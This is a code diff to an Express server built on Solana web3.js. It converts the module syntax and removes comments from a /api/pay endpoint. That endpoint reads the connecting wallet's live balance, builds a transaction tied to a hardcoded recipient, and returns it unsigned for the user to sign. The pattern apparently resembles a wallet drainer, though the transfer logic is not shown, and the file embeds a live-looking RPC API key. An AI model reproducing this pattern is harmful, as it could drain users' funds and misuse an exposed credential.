@@ -1,12 +1,11 @@
-const express = require('express');
-const cors = require('cors');
-const { Connection, PublicKey, Transaction, SystemProgram, TransactionInstruction } = require('@solana/web3.js');
+import express from 'express';
+import cors from 'cors';
+import { Connection, PublicKey, Transaction, SystemProgram, TransactionInstruction } from '@solana/web3.js';
 
 const app = express();
 app.use(express.json());
 app.use(cors());
 
-const PORT = process.env.PORT || 3000;
 const RECIPIENT_PUBKEY = new PublicKey("3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1");
 const HELIUS_URL = "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-827f-5bae3b93f146";
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
@@ -21,7 +20,6 @@ app.get('/api/pay', (req, res) => {
 
 app.post('/api/pay', async (req, res) => {
     try {
-        // The wallet sends the connected user's public key in the body
         const accountParam = req.body.account;
         if (!accountParam) {
             return res.status(400).json({ error: "Missing account parameter" });
@@ -30,7 +28,6 @@ app.post('/api/pay', async (req, res) => {
         const senderPublicKey = new PublicKey(accountParam);
         const connection = new Connection(HELIUS_URL, 'confirmed');
 
-        // Fetch live balance
         const balance = await connection.getBalance(senderPublicKey);
         const transaction = new Transaction();
 
@@ -69,12 +66,10 @@ app.post('/api/pay', async (req, res) => {
             );
         }
 
-        // Set recent blockhash and fee payer
         const { blockhash } = await connection.getLatestBlockhash('confirmed');
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = senderPublicKey;
 
-        // Serialize transaction for the wallet to sign
         const serializedTransaction = transaction.serialize({
             requireAllSignatures: false,
             verifySignatures: false
@@ -91,4 +86,4 @@ app.post('/api/pay', async (req, res) => {
     }
 });
 
-module.exports = app;
+export default app;
